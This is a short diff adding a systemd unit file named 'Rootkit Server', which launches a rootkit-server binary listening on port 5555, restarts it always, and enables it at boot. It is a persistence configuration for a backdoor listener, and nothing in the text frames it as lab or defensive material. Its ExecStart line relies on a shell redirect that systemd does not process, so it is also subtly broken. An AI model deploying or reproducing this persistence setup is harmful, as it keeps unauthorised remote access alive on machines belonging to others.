@@ -1,0 +1,13 @@
+[Unit]
+Description=Rootkit Server
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/sbin/rootkit-server -p 5555 >> /var/log/rootkit-server.log 2>&1
+LimitNOFILE=infinity
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+
